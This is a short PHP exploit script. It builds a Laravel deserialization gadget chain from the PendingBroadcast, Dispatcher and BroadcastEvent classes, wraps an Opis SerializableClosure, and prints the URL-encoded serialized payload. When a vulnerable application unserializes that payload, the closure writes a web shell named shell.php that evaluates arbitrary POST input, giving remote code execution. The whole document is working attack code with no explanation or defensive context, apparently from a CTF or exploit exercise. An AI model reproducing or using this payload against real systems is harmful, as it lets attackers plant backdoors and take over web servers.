<?php
// 1-1.php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;

        public function __construct($events, $event) {
            $this->events = $events;
            $this->event = $event;
        }
    }

    class BroadcastEvent {
        public $connection;
        public function __construct($connection) {
            $this->connection = $connection;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;
        public function __construct($queueResolver){
            $this->queueResolver = $queueResolver;
        }
    }
}


namespace {
    require "./vendor/autoload.php";
    $func = function(){file_put_contents("shell.php", "<?php eval(\$_POST['Dig2']) ?>");};
    $d = new \Opis\Closure\SerializableClosure($func);

    $c = new Illuminate\Broadcasting\BroadcastEvent('whoami');
    $b = new Illuminate\Bus\Dispatcher($d);
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
    print(urlencode(serialize($a)));
}